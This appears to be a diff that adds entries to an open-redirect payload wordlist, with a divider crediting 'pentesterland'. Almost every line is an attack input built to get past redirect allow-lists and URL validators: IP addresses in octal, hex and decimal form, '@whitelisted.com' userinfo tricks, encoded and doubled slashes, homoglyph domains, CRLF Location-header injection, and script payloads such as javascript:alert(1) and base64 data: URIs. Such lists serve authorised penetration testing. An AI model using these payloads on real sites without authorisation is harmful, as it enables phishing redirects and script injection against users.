+http://XY>.7d8T\205pZM@3627734734
+http://472.314.470.462
+http://www.whitelisteddomain.tld@472.314.470.462
+http://3H6k7lIAiqjfNeN@472.314.470.462
+http://XY>.7d8T\205pZM@472.314.470.462
+http://0330.072.0326.0316
+http://www.whitelisteddomain.tld@0330.072.0326.0316
+http://3H6k7lIAiqjfNeN@0330.072.0326.0316
+http://XY>.7d8T\205pZM@0330.072.0326.0316
+http://00330.00072.0000326.00000316
+http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http://[::216.58.214.206]
+http://www.whitelisteddomain.tld@[::216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::216.58.214.206]
+http://XY>.7d8T\205pZM@[::216.58.214.206]
+http://[::ffff:216.58.214.206]
+http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http://0xd8.072.54990
+http://www.whitelisteddomain.tld@0xd8.072.54990
+http://3H6k7lIAiqjfNeN@0xd8.072.54990
+http://XY>.7d8T\205pZM@0xd8.072.54990
+http://0xd8.3856078
+http://www.whitelisteddomain.tld@0xd8.3856078
+http://3H6k7lIAiqjfNeN@0xd8.3856078
+http://XY>.7d8T\205pZM@0xd8.3856078
+http://00330.3856078
+http://www.whitelisteddomain.tld@00330.3856078
+http://3H6k7lIAiqjfNeN@00330.3856078
+http://XY>.7d8T\205pZM@00330.3856078
+http://00330.0x3a.54990
+http://www.whitelisteddomain.tld@00330.0x3a.54990
+http://3H6k7lIAiqjfNeN@00330.0x3a.54990
+http://XY>.7d8T\205pZM@00330.0x3a.54990
+http:0xd8.0x3a.0xd6.0xce
+http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http:0xd83ad6ce
+http:www.whitelisteddomain.tld@0xd83ad6ce
+http:3H6k7lIAiqjfNeN@0xd83ad6ce
+http:XY>.7d8T\205pZM@0xd83ad6ce
+http:3627734734
+http:www.whitelisteddomain.tld@3627734734
+http:3H6k7lIAiqjfNeN@3627734734
+http:XY>.7d8T\205pZM@3627734734
+http:472.314.470.462
+http:www.whitelisteddomain.tld@472.314.470.462
+http:3H6k7lIAiqjfNeN@472.314.470.462
+http:XY>.7d8T\205pZM@472.314.470.462
+http:0330.072.0326.0316
+http:www.whitelisteddomain.tld@0330.072.0326.0316
+http:3H6k7lIAiqjfNeN@0330.072.0326.0316
+http:XY>.7d8T\205pZM@0330.072.0326.0316
+http:00330.00072.0000326.00000316
+http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http:[::216.58.214.206]
+http:www.whitelisteddomain.tld@[::216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::216.58.214.206]
+http:XY>.7d8T\205pZM@[::216.58.214.206]
+http:[::ffff:216.58.214.206]
+http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http:0xd8.072.54990
+http:www.whitelisteddomain.tld@0xd8.072.54990
+http:3H6k7lIAiqjfNeN@0xd8.072.54990
+http:XY>.7d8T\205pZM@0xd8.072.54990
+http:0xd8.3856078
+http:www.whitelisteddomain.tld@0xd8.3856078
+http:3H6k7lIAiqjfNeN@0xd8.3856078
+http:XY>.7d8T\205pZM@0xd8.3856078
+http:00330.3856078
+http:www.whitelisteddomain.tld@00330.3856078
+http:3H6k7lIAiqjfNeN@00330.3856078
+http:XY>.7d8T\205pZM@00330.3856078
+http:00330.0x3a.54990
+http:www.whitelisteddomain.tld@00330.0x3a.54990
+http:3H6k7lIAiqjfNeN@00330.0x3a.54990
+http:XY>.7d8T\205pZM@00330.0x3a.54990
+〱google.com
+〵google.com
+ゝgoogle.com
+ーgoogle.com
+ｰgoogle.com
+/〱google.com
+/〵google.com
+/ゝgoogle.com
+/ーgoogle.com
+/ｰgoogle.com
+%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+<>javascript:alert(1);
+<>//google.com
+//google.com\@www.whitelisteddomain.tld
+https://:@google.com\@www.whitelisteddomain.tld
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+ja\nva\tscript\r:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+http://google.com:80#@www.whitelisteddomain.tld/
+http://google.com:80?@www.whitelisteddomain.tld/
+http://google.com\www.whitelisteddomain.tld
+http://google.com&www.whitelisteddomain.tld
+http:///////////google.com
+\\google.com
+http://www.whitelisteddomain.tld.google.com
+/http://example.com
+/%5cexample.com
+/%2f%2fexample.com
+/example.com/%2f%2e%2e
+/http:/example.com
+/?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com
+/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com
+/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com
+/redirect?url=http://example.com&next=http://example.com&redirect=http://example.com&redir=http://example.com&rurl=http://example.com
+/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com
+/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com
+/.example.com
+///\;@example.com
+///example.com/
+///example.com
+///example.com/%2f..
+/////example.com/
+/////example.com
+/%09/example.com
+/%2f%2fexample.com
+/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
+/%5cexample.com
+/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+/.example.com
+//%09/example.com
+//%5cexample.com
+///%09/example.com
+///%5cexample.com
+////%09/example.com
+////%5cexample.com
+/////example.com
+/////example.com/
+////\;@example.com
+////example.com/
+////example.com/%2e%2e
+////example.com/%2e%2e%2f
+////example.com/%2f%2e%2e
+////example.com/%2f..
+////example.com//
+///\;@example.com
+///example.com
+///example.com/
+///example.com/%2e%2e
+///example.com/%2e%2e%2f
+///example.com/%2f%2e%2e
+///example.com/%2f..
+///example.com//
+//example.com
+//example.com/
+//example.com/%2e%2e
+//example.com/%2e%2e%2f
+//example.com/%2f%2e%2e
+//example.com/%2f..
+//example.com//
+//google%00.com
+//google%E3%80%82com
+//https:///example.com/%2e%2e
+//https://example.com/%2e%2e%2f
+//https://example.com//
+/<>//example.com
+/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
+/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redirect_uri=/\/example.com
+/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
+/\/\/example.com/
+/\/example.com/
+/example.com/%2f%2e%2e
+/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+/http://example.com
+/http:/example.com
+/https:/%5cexample.com/
+/https://%09/example.com
+/https://%5cexample.com
+/https:///example.com/%2e%2e
+/https:///example.com/%2f%2e%2e
+/https://example.com
+/https://example.com/
+/https://example.com/%2e%2e
+/https://example.com/%2e%2e%2f
+/https://example.com/%2f%2e%2e
+/https://example.com/%2f..
+/https://example.com//
+/https:example.com
+/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
+/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com&redirect_uri=/\/example.com
+/redirect?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
+
+
+
+============================================================================================================================================================= edit pentesterland
+
+<>//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+/////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+///\;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//\/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/.Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/\/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+/〱Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+.Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+\/\/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+〱Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ
+%01https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+%01https://google.com
+////%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%09/google.com
+///%09/google.com
+//%09/google.com
+/%09/google.com
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+////%09/whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%09/whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%09/whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%09/whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%09/whitelisted.com@google.com
+///%09/whitelisted.com@google.com
+//%09/whitelisted.com@google.com
+/%09/whitelisted.com@google.com
+&%0d%0a1Location:https://google.com
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+%19Jav%09asc%09ript:https%20://whitelisted.com/%250Aconfirm%25281%2529
+////216.58.214.206
+///216.58.214.206
+//216.58.214.206
+/\216.58.214.206
+/216.58.214.206
+216.58.214.206
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+%2f216.58.214.206//
+%2f216.58.214.206
+%2f216.58.214.206%2f%2f
+////Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+//%2f%2fⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%2f%2fⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+%2f$2f216.58.214.206
+$2f%2f216.58.214.206%2f%2f
+%2f$2f3627734734
+$2f%2f3627734734%2f%2f
+//%2f%2fgoogle.com
+/%2f%2fgoogle.com
+$2f%2fgoogle.com
+%2f$2fgoogle.com
+$2f%2fgoogle.com%2f%2f
+%2f3627734734//
+%2f3627734734
+%2f3627734734%2f%2f
+/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
+/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/
+%2fgoogle.com//
+%2fgoogle.com
+%2fgoogle.com%2f%2f
+////3627734734
+///3627734734
+//3627734734
+/\3627734734
+/3627734734
+3627734734
+//3H6k7lIAiqjfNeN@whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//3H6k7lIAiqjfNeN@whitelisted.com+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//3H6k7lIAiqjfNeN@whitelisted.com@google.com/
+//3H6k7lIAiqjfNeN@whitelisted.com+@google.com/
+////%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%5cgoogle.com
+///%5cgoogle.com
+//%5cgoogle.com
+/%5cgoogle.com
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+////%5cwhitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///%5cwhitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//%5cwhitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/%5cwhitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+////%5cwhitelisted.com@google.com
+///%5cwhitelisted.com@google.com
+//%5cwhitelisted.com@google.com
+/%5cwhitelisted.com@google.com
+/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+%68%74%74%70%73%3a%2f%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@whitelisted.com/
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@whitelisted.com/
+";alert(0);//
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
+data:whitelisted.com;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
+//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw
+//google%00.com
+/\google%252ecom
+google%252ecom
+<>//google.com
+/<>//google.com
+//;@google.com
+///;@google.com
+/////google.com/
+/////google.com
+////\;@google.com
+////google.com//
+////google.com/
+////google.com
+///\;@google.com
+///google.com//
+///google.com/
+///google.com
+//\/google.com/
+//\google.com
+//google.com//
+//google.com/
+//google.com
+/.google.com
+/\/\/google.com/
+/\/google.com/
+/\/google.com
+/\google.com
+/〱google.com
+/google.com
+../google.com
+.google.com
+@google.com
+\/\/google.com/
+〱google.com
+google.com
+google.com%23@whitelisted.com
+////google.com/%2e%2e
+///google.com/%2e%2e
+//google.com/%2e%2e
+/google.com/%2e%2e
+//google.com/%2E%2E
+////google.com/%2e%2e%2f
+///google.com/%2e%2e%2f
+//google.com/%2e%2e%2f
+////google.com/%2f..
+///google.com/%2f..
+//google.com/%2f..
+//google.com/%2F.. 
+/google.com/%2F.. 
+////google.com/%2f%2e%2e
+///google.com/%2f%2e%2e
+//google.com/%2f%2e%2e
+/google.com/%2f%2e%2e
+//google.com//%2F%2E%2E
+//google.com:80?@whitelisted.com/
+//google.com:80#@whitelisted.com/
+google.com/.jpg
+//google.com\twhitelisted.com/
+//google.com/whitelisted.com
+//google.com\@whitelisted.com
+google.com/whitelisted.com
+//google%E3%80%82com
+/http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/http:/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://.Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http:/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http:Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://00330.00072.0000326.00000316
+http:00330.00072.0000326.00000316
+http://00330.0x3a.54990
+http:00330.0x3a.54990
+http://00330.3856078
+http:00330.3856078
+http://0330.072.0326.0316
+http:0330.072.0326.0316
+http:%0a%0dⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http:%0a%0dgoogle.com
+http://0xd8.072.54990
+http:0xd8.072.54990
+http://0xd8.0x3a.0xd6.0xce
+http:0xd8.0x3a.0xd6.0xce
+http://0xd8.3856078
+http:0xd8.3856078
+http://0xd83ad6ce
+http:0xd83ad6ce
+http://[::216.58.214.206]
+http:[::216.58.214.206]
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%23.whitelisted.com/
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.whitelisted.com/
+http://3627734734
+http:3627734734
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%3F.whitelisted.com/
+http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http://3H6k7lIAiqjfNeN@00330.0x3a.54990
+http:3H6k7lIAiqjfNeN@00330.0x3a.54990
+http://3H6k7lIAiqjfNeN@00330.3856078
+http:3H6k7lIAiqjfNeN@00330.3856078
+http://3H6k7lIAiqjfNeN@0330.072.0326.0316
+http:3H6k7lIAiqjfNeN@0330.072.0326.0316
+http://3H6k7lIAiqjfNeN@0xd8.072.54990
+http:3H6k7lIAiqjfNeN@0xd8.072.54990
+http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http://3H6k7lIAiqjfNeN@0xd8.3856078
+http:3H6k7lIAiqjfNeN@0xd8.3856078
+http://3H6k7lIAiqjfNeN@0xd83ad6ce
+http:3H6k7lIAiqjfNeN@0xd83ad6ce
+http://3H6k7lIAiqjfNeN@[::216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::216.58.214.206]
+http://3H6k7lIAiqjfNeN@3627734734
+http:3H6k7lIAiqjfNeN@3627734734
+http://3H6k7lIAiqjfNeN@472.314.470.462
+http:3H6k7lIAiqjfNeN@472.314.470.462
+http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http://3H6k7lIAiqjfNeN@whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://3H6k7lIAiqjfNeN@whitelisted.com+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+http://3H6k7lIAiqjfNeN@whitelisted.com@google.com/
+http://3H6k7lIAiqjfNeN@whitelisted.com+@google.com/
+http://472.314.470.462
+http:472.314.470.462
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.whitelisted.com/
+/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80?@whitelisted.com/
+http://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ:80#@whitelisted.com/
+http://[::ffff:216.58.214.206]
+http:[::ffff:216.58.214.206]
+/http://google.com
+/http:/google.com
+http://;@google.com
+http://.google.com
+http://google.com
+http:/\/\google.com
+http:/google.com
+http:google.com
+http://google.com%23.whitelisted.com/
+http://google.com%2f%2f.whitelisted.com/
+http://google.com%3F.whitelisted.com/
+http://google.com%5c%5c.whitelisted.com/
+http://google.com:80?@whitelisted.com/
+http://google.com:80#@whitelisted.com/
+http://google.com\twhitelisted.com/
+//https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https:Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://%09/Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/https://%09/google.com
+https://%09/google.com
+https://%09/whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://%09/whitelisted.com@google.com
+https://%0a%0dⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://%0a%0dgoogle.com
+//https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+//https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+/https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+/https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f%2e%2e
+https%3a%2f%2fgoogle.com%2f
+/https://%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/https:/%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https:/%5cⓁ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+/https://%5cgoogle.com
+/https:/%5cgoogle.com/
+https://%5cgoogle.com
+https:/%5cgoogle.com/
+/https://%5cwhitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://%5cwhitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/https://%5cwhitelisted.com@google.com
+https://%5cwhitelisted.com@google.com
+https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77
+//https://google.com//
+/https://google.com//
+/https://google.com/
+/https://google.com
+/https:google.com
+https://////google.com
+https://google.com//
+https://google.com/
+https://google.com
+https:/\google.com
+https:google.com
+//https:///google.com/%2e%2e
+/https://google.com/%2e%2e
+https:///google.com/%2e%2e
+//https://google.com/%2e%2e%2f
+https://google.com/%2e%2e%2f
+/https://google.com/%2f..
+https://google.com/%2f..
+/https:///google.com/%2f%2e%2e
+/https://google.com/%2f%2e%2e
+https:///google.com/%2f%2e%2e
+https://google.com/%2f%2e%2e
+https://:@google.com\@whitelisted.com
+https://google.com?whitelisted.com
+https://google.com/whitelisted.com
+https://google.com\whitelisted.com
+https://google.com#whitelisted.com
+https://google%E3%80%82com
+//https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+/https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://:@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@whitelisted.com
+https://Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/whitelisted.com
+https://whitelisted.com;@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ//
+https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+/https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+https:///whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+//https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e%2f
+/https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
+https://whitelisted.com@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2f..
